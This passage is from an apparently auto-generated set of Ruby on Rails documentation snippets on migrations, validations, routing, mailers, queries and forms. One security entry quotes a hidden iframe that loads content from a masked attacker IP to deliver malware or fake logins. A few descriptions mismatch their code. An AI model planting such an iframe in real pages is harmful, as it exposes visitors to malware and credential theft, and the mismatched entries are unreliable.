  end

  def down
    change_table :products do |t|
      t.change :price, :integer
    end
  end
end

----------------------------------------

TITLE: ApplicationMailer Base Class Definition
DESCRIPTION: The ApplicationMailer class that inherits from ActionMailer::Base and defines common attributes for all mailers, including the default sender email and layout.

LANGUAGE: ruby
CODE:
# app/mailers/application_mailer.rb
class ApplicationMailer < ActionMailer::Base
  default from: "from@example.com"
  layout "mailer"
end

----------------------------------------

TITLE: Installing Dependencies on Ubuntu
DESCRIPTION: Commands to install all required dependencies for Rails development on Ubuntu, including database systems, Redis, memcached, and tools for image/video processing. Also includes steps to install Node.js and Yarn.

LANGUAGE: bash
CODE:
$ sudo apt-get update
$ sudo apt-get install sqlite3 libsqlite3-dev mysql-server libmysqlclient-dev postgresql postgresql-client postgresql-contrib libpq-dev redis-server memcached imagemagick ffmpeg mupdf mupdf-tools libxml2-dev libvips42 poppler-utils libyaml-dev libffi-dev

# Install Yarn
# Use this command if you do not have Node.js installed
# ref: https://github.com/nodesource/distributions#installation-instructions
$ sudo mkdir -p /etc/apt/keyrings
$ curl --fail --silent --show-error --location https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
$ echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_20.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
$ sudo apt-get update
$ sudo apt-get install -y nodejs

# Once you have installed Node.js, install the yarn npm package
$ sudo npm install --global yarn

----------------------------------------

TITLE: Setting Database Retry Deadline in Rails
DESCRIPTION: This configuration demonstrates how to set a time limit for retrying database queries. The retry_deadline parameter prevents retries after a specified number of seconds have elapsed since the first attempt.

LANGUAGE: yaml
CODE:
development:
  adapter: mysql2
  retry_deadline: 5 # Stop retrying queries after 5 seconds

----------------------------------------

TITLE: Checking Error Count with errors.size
DESCRIPTION: This code demonstrates how to check the total number of validation errors using the errors.size method. It shows how the error count differs between invalid and valid objects.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.size
=> 2

irb> person = Person.new(name: "Andrea", email: "andrea@example.com")
irb> person.valid?
=> true
irb> person.errors.size
=> 0

----------------------------------------

TITLE: Using String Placeholders in ActiveRecord Queries
DESCRIPTION: Demonstrates safe query parameterization using question mark placeholders to prevent SQL injection when including user input in database queries.

LANGUAGE: ruby
CODE:
Book.where("title = ?", params[:title])

----------------------------------------

TITLE: Defining Unsubscribe Route in Rails
DESCRIPTION: Adds a route resource for unsubscribe functionality with only the show action enabled. This route will be used in email links to allow users to unsubscribe.

LANGUAGE: ruby
CODE:
  resource :unsubscribe, only: [ :show ]

----------------------------------------

TITLE: Generating a Basic Job in Rails using Command Line
DESCRIPTION: Creates a new background job class in app/jobs with an attached test case. This is the standard way to generate job files in Rails.

LANGUAGE: bash
CODE:
$ bin/rails generate job guests_cleanup
invoke  test_unit
create    test/jobs/guests_cleanup_job_test.rb
create  app/jobs/guests_cleanup_job.rb

----------------------------------------

TITLE: Unit Testing a Mailer in Rails with ActionMailer::TestCase
DESCRIPTION: Shows how to unit test a mailer in Rails using ActionMailer::TestCase. This example tests that the invite email has the correct sender, recipient, subject, and body content.

LANGUAGE: ruby
CODE:
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.create_invite("me@example.com",
                                     "friend@example.com", Time.now)

    # Send the email, then test that it got queued
    assert_emails 1 do
      email.deliver_now
    end

    # Test the body of the sent email contains what we expect it to
    assert_equal ["me@example.com"], email.from
    assert_equal ["friend@example.com"], email.to
    assert_equal "You have been invited by me@example.com", email.subject
    assert_equal read_fixture("invite").join, email.body.to_s
  end
end

----------------------------------------

TITLE: Subscribing to Custom Events in Ruby with ActiveSupport::Notifications
DESCRIPTION: Demonstrates how to listen to custom events by subscribing to them with ActiveSupport::Notifications. The subscriber receives the event name, start and end times, a unique ID, and the data payload.

LANGUAGE: ruby
CODE:
ActiveSupport::Notifications.subscribe "my.custom.event" do |name, started, finished, unique_id, data|
  puts data.inspect # {:this=>:data}
end

----------------------------------------

TITLE: Creating a Rails Application with PostgreSQL Database
DESCRIPTION: Demonstrates how to create a Rails application preconfigured to use PostgreSQL as the database by using the --database option with the rails new command.

LANGUAGE: bash
CODE:
$ rails new petstore --database=postgresql
      create
      create  app/controllers
      create  app/helpers
...

----------------------------------------

TITLE: Defining Model Associations in Rails
DESCRIPTION: Demonstrates how to define a one-to-many relationship between models using has_many. This example shows an Author model associated with multiple Book records.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books
end

----------------------------------------

TITLE: Adding Custom Error Messages with errors.add in Rails
DESCRIPTION: Example of manually adding error messages to a model using the errors.add method. This demonstrates how to create custom validation logic and error messages.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validate do |person|
    errors.add :name, :too_short, message: "is not long enough"
  end
end

----------------------------------------

TITLE: Using a Custom Cache Store in Rails
DESCRIPTION: Configures Rails to use a custom cache store implementation by setting the cache_store to an instance of your custom class. This allows swapping in any caching technology into a Rails application.

LANGUAGE: ruby
CODE:
config.cache_store = MyCacheStore.new

----------------------------------------

TITLE: Using assert_no_queries for Testing SQL Query Absence in Rails
DESCRIPTION: Tests that a block generates no SQL queries, with option to include or exclude schema queries.

LANGUAGE: ruby
CODE:
assert_no_queries(include_schema: false, &block)

----------------------------------------

TITLE: Setting Default URL Options in Rails Controllers
DESCRIPTION: This code shows how to define default URL options that will be used for all URL generation in a Rails application. By defining the default_url_options method in ApplicationController, every URL will include the current locale by default.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  def default_url_options
    { locale: I18n.locale }
  end
end

----------------------------------------

TITLE: Creating Modular Functionality with ActiveSupport::Concern
DESCRIPTION: Demonstrates how to create a reusable concern module for an engine model, containing shared business logic, callbacks, and class methods that can be included in both the engine and host application.

LANGUAGE: ruby
CODE:
# Blorgh/lib/concerns/models/article.rb

module Blorgh::Concerns::Models::Article
  extend ActiveSupport::Concern

  # `included do` causes the block to be evaluated in the context
  # in which the module is included (i.e. Blorgh::Article),
  # rather than in the module itself.
  included do
    attr_accessor :author_name
    belongs_to :author, class_name: "User"

    before_validation :set_author

    private
      def set_author
        self.author = User.find_or_create_by(name: author_name)
      end
  end

  def summary
    "#{title}"
  end

  module ClassMethods
    def some_class_method
      "some class method string"
    end
  end
end

----------------------------------------

TITLE: Adding File Attachment to Rails Model with Active Storage
DESCRIPTION: Demonstrates how to add a file attachment capability to a Product model using Active Storage's has_one_attached method. This allows associating a single image with each product.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  has_one_attached :featured_image
  has_rich_text :description
  validates :name, presence: true
end

----------------------------------------

TITLE: Configuring SQLite for Solid Cache in database.yml
DESCRIPTION: Example configuration for setting up a separate SQLite database for Solid Cache in production. This creates a dedicated database file for cache storage with its own migrations path.

LANGUAGE: yaml
CODE:
production:
  primary:
    <<: *default
    database: storage/production.sqlite3
  cache:
    <<: *default
    database: storage/production_cache.sqlite3
    migrations_paths: db/cache_migrate

----------------------------------------

TITLE: Enabling Strict Loading on Individual Records in Rails
DESCRIPTION: This snippet demonstrates how to enable strict loading directly on a record instance using strict_loading!. It also shows how to use the :n_plus_one_only mode to only raise errors for associations that would trigger N+1 queries.

LANGUAGE: ruby
CODE:
user = User.first
user.strict_loading!
user.address.city # raises an ActiveRecord::StrictLoadingViolationError
user.comments.to_a # raises an ActiveRecord::StrictLoadingViolationError

LANGUAGE: ruby
CODE:
user.strict_loading!(mode: :n_plus_one_only)
user.address.city # => "Tatooine"
user.comments.to_a # => [#<Comment:0x00...]
user.comments.first.likes.to_a # raises an ActiveRecord::StrictLoadingViolationError

----------------------------------------

TITLE: Controlling When Custom Validation Methods Run in Rails
DESCRIPTION: Shows how to control when custom validation methods run by using the :on option with the validate method. This allows custom validations to run only on create or update operations.

LANGUAGE: ruby
CODE:
class Invoice < ApplicationRecord
  validate :active_customer, on: :create

  def active_customer
    errors.add(:customer_id, "is not active") unless customer.active?
  end
end

----------------------------------------

TITLE: Managing Cookies in a Rails Controller
DESCRIPTION: Demonstrates reading and writing cookies in a CommentsController. This example shows how to auto-fill form data from a cookie, store user preferences, and delete cookies when no longer needed.

LANGUAGE: ruby
CODE:
class CommentsController < ApplicationController
  def new
    # Auto-fill the commenter's name if it has been stored in a cookie
    @comment = Comment.new(author: cookies[:commenter_name])
  end

  def create
    @comment = Comment.new(comment_params)
    if @comment.save
      if params[:remember_name]
        # Save the commenter's name in a cookie.
        cookies[:commenter_name] = @comment.author
      else
        # Delete cookie for the commenter's name, if any.
        cookies.delete(:commenter_name)
      end
      redirect_to @comment.article
    else
      render action: "new"
    end
  end
end

----------------------------------------

TITLE: Creating a User Session in Rails
DESCRIPTION: SessionsController create action that authenticates a user and stores their ID in the session. This is a typical implementation of a login functionality in Rails.

LANGUAGE: ruby
CODE:
class SessionsController < ApplicationController
  def create
    if user = User.authenticate_by(email: params[:email], password: params[:password])
      # Save the user ID in the session so it can be used in
      # subsequent requests
      session[:current_user_id] = user.id
      redirect_to root_url
    end
  end
end

----------------------------------------

TITLE: Sample Routes Configuration in Rails Application
DESCRIPTION: Example of a routes configuration in a typical Rails application, showing nested resources, singular resources, and route resolution.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
  resources :brands, only: [:index, :show] do
    resources :products, only: [:index, :show]
  end

  resource :basket, only: [:show, :update, :destroy]

  resolve("Basket") { route_for(:basket) }
end

----------------------------------------

TITLE: Length Validation with Multiple Constraints in Rails
DESCRIPTION: Demonstrates how to validate the length of attributes using various constraints including minimum, maximum, range, and exact length requirements.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :name, length: { minimum: 2 }
  validates :bio, length: { maximum: 500 }
  validates :password, length: { in: 6..20 }
  validates :registration_number, length: { is: 6 }
end

----------------------------------------

TITLE: Resource Routing Declaration for Photos
DESCRIPTION: A simple resource routing declaration that creates seven different routes for the Photos resource, mapping to standard CRUD actions.

LANGUAGE: ruby
CODE:
resources :photos

----------------------------------------

TITLE: Creating a Custom Initializer Generator in Ruby on Rails
DESCRIPTION: A Ruby class that defines a custom generator for creating initializer files in a Rails application. This generator inherits from Rails::Generators::NamedBase and implements methods to copy template files.

LANGUAGE: ruby
CODE:
class InitializerGenerator < Rails::Generators::NamedBase
  class_option :scope, type: :string, default: "app"
 end

----------------------------------------

TITLE: Using Active Record Attributes API with Custom Type Definitions
DESCRIPTION: Demonstrates how to use the new Active Record Attributes API to define custom attribute types, override defaults, and create virtual attributes not backed by database columns.

LANGUAGE: ruby
CODE:
# db/schema.rb
create_table :store_listings, force: true do |t|
  t.decimal :price_in_cents
  t.string :my_string, default: "original default"
end

LANGUAGE: ruby
CODE:
# app/models/store_listing.rb
class StoreListing < ActiveRecord::Base
end

LANGUAGE: ruby
CODE:
store_listing = StoreListing.new(price_in_cents: '10.1')

# before
store_listing.price_in_cents # => BigDecimal.new(10.1)
StoreListing.new.my_string # => "original default"

class StoreListing < ActiveRecord::Base
  attribute :price_in_cents, :integer # custom type
  attribute :my_string, :string, default: "new default" # default value
  attribute :my_default_proc, :datetime, default: -> { Time.now } # default value
  attribute :field_without_db_column, :integer, array: true
end

# after
store_listing.price_in_cents # => 10
StoreListing.new.my_string # => "new default"
StoreListing.new.my_default_proc # => 2015-05-30 11:04:48 -0600
model = StoreListing.new(field_without_db_column: ["1", "2", "3"])
model.attributes # => {field_without_db_column: [1, 2, 3]}

----------------------------------------

TITLE: SQL Generated by Find Operations in Rails
DESCRIPTION: Shows the SQL generated by find_by and find methods, demonstrating how Active Record translates these finder methods into SQL queries with appropriate WHERE clauses and limits.

LANGUAGE: sql
CODE:
-- Book.find_by(title: "Metaprogramming Ruby 2")
SELECT "books".* FROM "books" WHERE "books"."title" = ? LIMIT ?  [["title", "Metaprogramming Ruby 2"], ["LIMIT", 1]]

-- Book.find(42)
SELECT "books".* FROM "books" WHERE "books"."id" = ? LIMIT ?  [["id", 42], ["LIMIT", 1]]

----------------------------------------

TITLE: Implementing HTTP Digest Authentication in Rails Controllers
DESCRIPTION: This snippet shows how to implement HTTP Digest Authentication in a Rails controller using authenticate_or_request_with_http_digest. This method provides a more secure authentication mechanism than basic auth since it doesn't send passwords in plain text.

LANGUAGE: ruby
CODE:
class AdminsController < ApplicationController
  USERS = { "admin" => "helloworld" }

  before_action :authenticate

  private
    def authenticate
      authenticate_or_request_with_http_digest do |username|
        USERS[username]
      end
    end
end

----------------------------------------

TITLE: Accessing Validation Errors with errors.full_messages
DESCRIPTION: This code shows how to access validation error messages using the errors.full_messages method. It demonstrates checking validity and retrieving formatted error messages.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.full_messages
=> ["Name can't be blank", "Name is too short (minimum is 3 characters)"]

irb> person = Person.new(name: "John Doe")
irb> person.valid?
=> true
irb> person.errors.full_messages
=> []

irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.first.details
=> {:error=>:too_short, :count=>3}

----------------------------------------

TITLE: Implementing around_action for Performance Monitoring in Rails
DESCRIPTION: Uses an around_action callback to measure and log the execution time of controller actions. The callback wraps the action execution with timing logic and maintains access to the controller context.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  around_action :measure_execution_time

  private
    def measure_execution_time
      start_time = Time.now
      yield  # This executes the action
      end_time = Time.now

      duration = end_time - start_time
      Rails.logger.info "Action #{action_name} from controller #{controller_name} took #{duration.round(2)} seconds to execute."
    end
end

----------------------------------------

TITLE: Using ActiveSupport.on_load to Defer Framework Loading in Rails
DESCRIPTION: This code example demonstrates how to avoid premature loading of Rails frameworks by using ActiveSupport.on_load. It shows the proper way to include modules in ActiveRecord::Base without loading the entire framework at boot time.

LANGUAGE: ruby
CODE:
ActiveRecord::Base.include(MyActiveRecordHelper)

----------------------------------------

TITLE: Generating Migration for Adding Inventory Count to Products
DESCRIPTION: Shows the Rails generator command to create a migration for adding an inventory_count field to the Products table. The integer type is specified for storing numeric inventory values.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddInventoryCountToProducts inventory_count:integer

----------------------------------------

TITLE: Checking Validation Errors on Created Record in Rails
DESCRIPTION: Shows how to inspect validation errors on a model after using the create method, which returns the model instance regardless of validity. Demonstrates error reporting.

LANGUAGE: ruby
CODE:
irb> user = User.create
=> #<User:0x000000013e8b5008 id: nil, name: nil>
irb> user.errors.full_messages
=> ["Name can't be blank"]

----------------------------------------

TITLE: Testing Validity of Active Record Objects in IRB Console
DESCRIPTION: Examples of checking validity of Person objects in the Rails console using the valid? method. This demonstrates how validations prevent invalid objects from being saved.

LANGUAGE: irb
CODE:
irb> Person.new(name: "John Doe").valid?
=> true
irb> Person.new(name: nil).valid?
=> false

----------------------------------------

TITLE: Accessing Validation Errors in Rails
DESCRIPTION: Demonstrates how to access validation errors on a model instance. After a failed validation, the errors method returns an ActiveModel::Errors object that contains information about which validations failed.

LANGUAGE: irb
CODE:
store(dev)> product.errors
=> #<ActiveModel::Errors [#<ActiveModel::Error attribute=name, type=blank, options={}>]>

----------------------------------------

TITLE: Creating Channel Subscriptions in JavaScript with ActionCable
DESCRIPTION: Creates subscriptions to ChatChannel and AppearanceChannel using the consumer object. This demonstrates how a client can subscribe to multiple channels with different parameters.

LANGUAGE: javascript
CODE:
// app/javascript/channels/chat_channel.js
import consumer from "./consumer"

consumer.subscriptions.create({ channel: "ChatChannel", room: "Best Room" })

// app/javascript/channels/appearance_channel.js
import consumer from "./consumer"

consumer.subscriptions.create({ channel: "AppearanceChannel" })

----------------------------------------

TITLE: Creating a Table with Polymorphic Association
DESCRIPTION: Migration that creates a table with a polymorphic association. This creates taggable_id and taggable_type columns for implementing polymorphic relationships.

LANGUAGE: ruby
CODE:
create_table :taggings do |t|
  t.references :taggable, polymorphic: true
end

----------------------------------------

TITLE: Using PostgreSQL Hstore for Key-Value Storage in Rails
DESCRIPTION: Demonstrates enabling the hstore extension and using it for key-value pair storage in a database column. Shows migration setup, model definition, and querying based on specific key values stored in the hstore.

LANGUAGE: ruby
CODE:
# db/migrate/20131009135255_create_profiles.rb
class CreateProfiles < ActiveRecord::Migration[8.1]
  enable_extension "hstore" unless extension_enabled?("hstore")
  create_table :profiles do |t|
    t.hstore "settings"
  end
end

LANGUAGE: ruby
CODE:
# app/models/profile.rb
class Profile < ApplicationRecord
end

LANGUAGE: ruby
CODE:
irb> Profile.create(settings: { "color" => "blue", "resolution" => "800x600" })

irb> profile = Profile.first
irb> profile.settings
=> {"color"=>"blue", "resolution"=>"800x600"}

irb> profile.settings = {"color" => "yellow", "resolution" => "1280x1024"}
irb> profile.save!

irb> Profile.where("settings->'color' = ?", "yellow")
=> #<ActiveRecord::Relation [#<Profile id: 1, settings: {"color"=>"yellow", "resolution"=>"1280x1024"}>]>

----------------------------------------

TITLE: Migration File for Creating Books Table in Ruby
DESCRIPTION: Generated migration file that defines the structure of the books table. The migration includes title and author columns, and timestamps for created_at and updated_at.

LANGUAGE: ruby
CODE:
# Note:
# The `id` column, as the primary key, is automatically created by convention.
# Columns `created_at` and `updated_at` are added by `t.timestamps`.

# db/migrate/20240220143807_create_books.rb
class CreateBooks < ActiveRecord::Migration[8.1]
  def change
    create_table :books do |t|
      t.string :title
      t.string :author

      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Implementing many-to-many relationship using has_many :through in Ruby on Rails
DESCRIPTION: Demonstrates how to set up a many-to-many relationship between Physician and Patient models through an Appointment model. This pattern allows physicians to have many patients and patients to have many physicians.

LANGUAGE: ruby
CODE:
class Physician < ApplicationRecord
  has_many :appointments
  has_many :patients, through: :appointments
end

class Appointment < ApplicationRecord
  belongs_to :physician
  belongs_to :patient
end

class Patient < ApplicationRecord
  has_many :appointments
  has_many :physicians, through: :appointments
end

----------------------------------------

TITLE: Creating a Named Scope for Time Range Filtering
DESCRIPTION: Demonstrates creating a named scope in an Order model to encapsulate the time range condition logic. This creates a reusable scope that can filter orders created within a specified time range.

LANGUAGE: ruby
CODE:
class Order < ApplicationRecord
  belongs_to :customer

  scope :created_in_time_range, ->(time_range) {
    where(created_at: time_range)
  }
end

----------------------------------------

TITLE: Testing Touch Callbacks with Associations in Rails Console
DESCRIPTION: IRB example demonstrating how touch callbacks work with model associations. It shows that touching a Book record also triggers the touch callback on its associated Library record, demonstrating propagation of touch events through associations.

LANGUAGE: irb
CODE:
irb> book = Book.last
=> #<Book id: 1, library_id: 1, created_at: "2013-11-25 17:04:22", updated_at: "2013-11-25 17:05:05">

irb> book.touch # triggers book.library.touch
A Book was touched
Book/Library was touched
=> true

----------------------------------------

TITLE: Creating a Reusable Callback Class with Instance Methods
DESCRIPTION: Example of encapsulating callback logic in a separate class with instance methods. This allows the callback behavior to be reused across multiple models and makes it easier to test and modify.

LANGUAGE: ruby
CODE:
class FileDestroyerCallback
  def after_commit(file)
    if File.exist?(file.filepath)
      File.delete(file.filepath)
    end
  end
end

----------------------------------------

TITLE: File Upload with form_with and model
DESCRIPTION: Demonstrates how to create a file upload field within a form_with helper using a model. The file_field helper automatically sets the form's enctype to multipart/form-data, which is required for file uploads.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |form| %>
  <%= form.file_field :csv_file %>
<% end %>

----------------------------------------

TITLE: Configuring Class Name for Associations in Rails
DESCRIPTION: Shows how to use the class_name option to specify a different model name than what would be inferred from the association name. This allows for more flexibility in naming associations.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  belongs_to :author, class_name: "Patron"
end

----------------------------------------

TITLE: Creating Routes with Multiple Dynamic Segments in Rails
DESCRIPTION: Defines a route with multiple dynamic segments that will be available in the params hash. Each segment preceded by a colon becomes a parameter in the controller.

LANGUAGE: ruby
CODE:
get "photos/:id/:user_id", to: "photos#show"

----------------------------------------

TITLE: Optimized Block-Based Logging in Ruby on Rails
DESCRIPTION: This snippet shows the recommended block-based approach to logging that uses lazy evaluation, only interpolating strings when the debug level is actually enabled.

LANGUAGE: ruby
CODE:
logger.debug { "Person attributes hash: #{@person.attributes.inspect}" }

----------------------------------------

TITLE: Joining Nested Associations (Single Level) in ActiveRecord
DESCRIPTION: Demonstrates joining nested associations using a hash syntax. This query joins books with reviews and then reviews with customers to find all books that have been reviewed by a customer.

LANGUAGE: ruby
CODE:
Book.joins(reviews: :customer)

LANGUAGE: sql
CODE:
SELECT books.* FROM books
  INNER JOIN reviews ON reviews.book_id = books.id
  INNER JOIN customers ON customers.id = reviews.customer_id

----------------------------------------

TITLE: Deleting Records in Rails
DESCRIPTION: Shows how to delete a record from the database using the destroy method. This example finds a book by title and then removes it from the database.

LANGUAGE: ruby
CODE:
book = Book.find_by(title: "The Lord of the Rings")
book.destroy

----------------------------------------

TITLE: Adding Foreign Key Constraints in Rails Migrations
DESCRIPTION: Demonstrates how to add a foreign key constraint between two tables. This ensures referential integrity by guaranteeing that articles.author_id references a valid id in the authors table.

LANGUAGE: ruby
CODE:
add_foreign_key :articles, :authors

----------------------------------------

TITLE: ProductsController with Database Query
DESCRIPTION: Updates the index action to fetch all products from the database and store them in an instance variable (@products) that can be accessed in the view.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def index
    @products = Product.all
  end
end

----------------------------------------

TITLE: Using Asynchronous Active Record Queries in Ruby
DESCRIPTION: Example demonstrating how to use the new async_count method for asynchronous database operations. The code shows the difference between synchronous and asynchronous count operations, with the latter returning a promise that can be resolved with the .value method.

LANGUAGE: ruby
CODE:
# Synchronous count
published_count = Post.where(published: true).count # => 10

# Asynchronous count
promise = Post.where(published: true).async_count # => #<ActiveRecord::Promise status=pending>
promise.value # => 10

----------------------------------------

TITLE: Website Defacement Using Hidden IFrame
DESCRIPTION: An example of a malicious iframe injection used in real attacks to load content from an attacker-controlled server. The iframe is hidden with CSS and could be used to load malware or fake login forms.

LANGUAGE: html
CODE:
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>

----------------------------------------

TITLE: Using left_outer_joins in ActiveRecord for Optional Associations
DESCRIPTION: Demonstrates using left_outer_joins to include records whether or not they have associated records. This query returns all customers with a count of their reviews, including customers who have no reviews at all.

LANGUAGE: ruby
CODE:
Customer.left_outer_joins(:reviews).distinct.select("customers.*, COUNT(reviews.*) AS reviews_count").group("customers.id")

LANGUAGE: sql
CODE:
SELECT DISTINCT customers.*, COUNT(reviews.*) AS reviews_count FROM customers
LEFT OUTER JOIN reviews ON reviews.customer_id = customers.id GROUP BY customers.id

----------------------------------------

TITLE: Registering Callbacks for Specific Lifecycle Events in Ruby on Rails
DESCRIPTION: Demonstrates how to register callbacks to fire only on certain life cycle events using the :on option. This example shows callbacks being triggered on create and update contexts, providing control over when callbacks are executed.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation :ensure_username_has_value, on: :create

  # :on takes an array as well
  after_validation :set_location, on: [ :create, :update ]

  private
    def ensure_username_has_value
      if username.blank?
        self.username = email
      end
    end

    def set_location
      self.location = LocationService.query(self)
    end
end

----------------------------------------

TITLE: Defining and Using Simple Scopes in Ruby on Rails
DESCRIPTION: This snippet demonstrates how to define a simple scope in a Rails model and how to call it on both the model class and on associations. It also shows how scopes can be chained together.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  scope :out_of_print, -> { where(out_of_print: true) }
end

LANGUAGE: irb
CODE:
irb> Book.out_of_print
=> #<ActiveRecord::Relation> # all out of print books

LANGUAGE: irb
CODE:
irb> author = Author.first
irb> author.books.out_of_print
=> #<ActiveRecord::Relation> # all out of print books by `author`

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  scope :out_of_print, -> { where(out_of_print: true) }
  scope :out_of_print_and_expensive, -> { out_of_print.where("price > 500") }
end

----------------------------------------

TITLE: Conditional Display of Edit and Delete Links for Products
DESCRIPTION: Shows how to update the product show view to only display Edit and Delete links when the user is authenticated. Uses a conditional block around the links to check authentication status.

LANGUAGE: erb
CODE:
<h1><%= @product.name %></h1>

<%= link_to "Back", products_path %>
<% if authenticated? %>
  <%= link_to "Edit", edit_product_path(@product) %>
  <%= button_to "Delete", @product, method: :delete, data: { turbo_confirm: "Are you sure?" } %>
<% end %>

----------------------------------------

TITLE: Using PostgreSQL Range Types in Rails for Date Ranges
DESCRIPTION: Demonstrates how to use PostgreSQL's range types to store and query date ranges. Shows migration setup, model definition, and examples of creating and querying records based on range containment and bounds.

LANGUAGE: ruby
CODE:
# db/migrate/20130923065404_create_events.rb
create_table :events do |t|
  t.daterange "duration"
end

LANGUAGE: ruby
CODE:
# app/models/event.rb
class Event < ApplicationRecord
end

LANGUAGE: ruby
CODE:
irb> Event.create(duration: Date.new(2014, 2, 11)..Date.new(2014, 2, 12))

irb> event = Event.first
irb> event.duration
=> Tue, 11 Feb 2014...Thu, 13 Feb 2014

## All Events on a given date
irb> Event.where("duration @> ?::date", Date.new(2014, 2, 12))

## Working with range bounds
irb> event = Event.select("lower(duration) AS starts_at").select("upper(duration) AS ends_at").first

irb> event.starts_at
=> Tue, 11 Feb 2014
irb> event.ends_at
=> Thu, 13 Feb 2014

----------------------------------------

TITLE: Proc-Based Custom Validation Messages in Rails
DESCRIPTION: This snippet shows how to use a Proc for dynamic error messages. The Proc receives the object being validated and a data hash, allowing for complex, context-aware error messages.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :username,
    uniqueness: {
      # object = person object being validated
      # data = { model: "Person", attribute: "Username", value: <username> }
      message: ->(object, data) do
        "Hey #{object.name}, #{data[:value]} is already taken."
      end
    }
end

----------------------------------------

TITLE: Using reversible for Migration with change_table in Ruby on Rails
DESCRIPTION: Demonstrates how to use the reversible method in a Rails migration to specify different behaviors when running and reverting a migration. This example changes a price column from integer to string type and back.

LANGUAGE: ruby
CODE:
class ChangeProductsPrice < ActiveRecord::Migration[8.1]
  def change
    reversible do |direction|
      change_table :products do |t|
        direction.up   { t.change :price, :string }
        direction.down { t.change :price, :integer }
      end
    end
  end
end

----------------------------------------

TITLE: Form with Destroy Checkbox for Associated Objects
DESCRIPTION: Demonstrates how to include a checkbox for deleting associated objects in a nested form. When checked, the associated record will be destroyed when the form is submitted.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |form| %>
  Addresses:
  <ul>
    <%= form.fields_for :addresses do |addresses_form| %>
      <li>
        <%= addresses_form.checkbox :_destroy %>
        <%= addresses_form.label :kind %>
        <%= addresses_form.text_field :kind %>
        ...
      </li>
    <% end %>
  </ul>
<% end %>

----------------------------------------

TITLE: Rendering Fields with Index Option in Rails Forms
DESCRIPTION: Demonstrates how to use the fields_for helper with the :index option to render form fields for each address of a person. This allows for clear identification of which records should be modified when processing the params hash.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |person_form| %>
  <%= person_form.text_field :name %>
  <% @person.addresses.each do |address| %>
    <%= person_form.fields_for address, index: address.id do |address_form| %>
      <%= address_form.text_field :city %>
    <% end %>
  <% end %>
<% end %>

----------------------------------------

TITLE: Destroying a User Session in Rails
DESCRIPTION: SessionsController destroy action that logs out a user by removing their ID from the session. This implementation also sets a flash notice to provide user feedback about the successful logout.

LANGUAGE: ruby
CODE:
class SessionsController < ApplicationController
  def destroy
    session.delete(:current_user_id)
    # Clear the current user as well.
    @current_user = nil
    redirect_to root_url, status: :see_other
  end
end

----------------------------------------

TITLE: Enforcing Strict Loading to Prevent Lazy Loading in Rails
DESCRIPTION: This snippet shows how to use strict_loading on a relation to prevent lazy loading of associations. When enabled, attempting to lazily load any association will raise an ActiveRecord::StrictLoadingViolationError.

LANGUAGE: ruby
CODE:
user = User.strict_loading.first
user.address.city # raises an ActiveRecord::StrictLoadingViolationError
user.comments.to_a # raises an ActiveRecord::StrictLoadingViolationError

----------------------------------------

TITLE: Testing Email Delivery in System Tests with Rails
DESCRIPTION: A system test example showing how to verify email delivery when interacting with the UI. This test navigates to the invite page, fills in an email address, and verifies that clicking the Invite button sends exactly one email.

LANGUAGE: ruby
CODE:
# System Test
require "test_helper"

class UsersTest < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :headless_chrome

  test "inviting a friend" do
    visit invite_users_url
    fill_in "Email", with: "friend@example.com"
    assert_emails 1 do
      click_on "Invite"
    end
  end
end

----------------------------------------

TITLE: Running EXPLAIN on ActiveRecord queries
DESCRIPTION: Demonstrates how to use the explain method to analyze query execution plans. The output varies by database adapter and helps optimize query performance.

LANGUAGE: ruby
CODE:
Customer.where(id: 1).joins(:orders).explain

LANGUAGE: ruby
CODE:
Customer.where(id: 1).includes(:orders).explain

----------------------------------------

TITLE: Implementing Cookie Rotation for Digest Algorithm Change
DESCRIPTION: Configuration for rotating cookie settings to smoothly transition from SHA1 to SHA256 digest algorithm. This allows existing cookies to be upgraded without invalidating them immediately.

LANGUAGE: ruby
CODE:
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end

----------------------------------------

TITLE: Displaying Validation Errors in Rails Views
DESCRIPTION: This HTML+ERB code demonstrates how to display validation errors in a Rails view. It iterates through all errors on a model and displays them in a formatted list with a header indicating the number of errors.

LANGUAGE: html+erb
CODE:
<% if @article.errors.any? %>
  <div id="error_explanation">
    <h2><%= pluralize(@article.errors.count, "error") %> prohibited this article from being saved:</h2>

    <ul>
      <% @article.errors.each do |error| %>
        <li><%= error.full_message %></li>
      <% end %>
    </ul>
  </div>
<% end %>

----------------------------------------

TITLE: Adding Foreign Key Constraints with References in Rails Migrations
DESCRIPTION: Demonstrates adding a reference with an explicit foreign key constraint. This ensures referential integrity between the users and roles tables.

LANGUAGE: ruby
CODE:
add_reference :users, :role, foreign_key: true

----------------------------------------

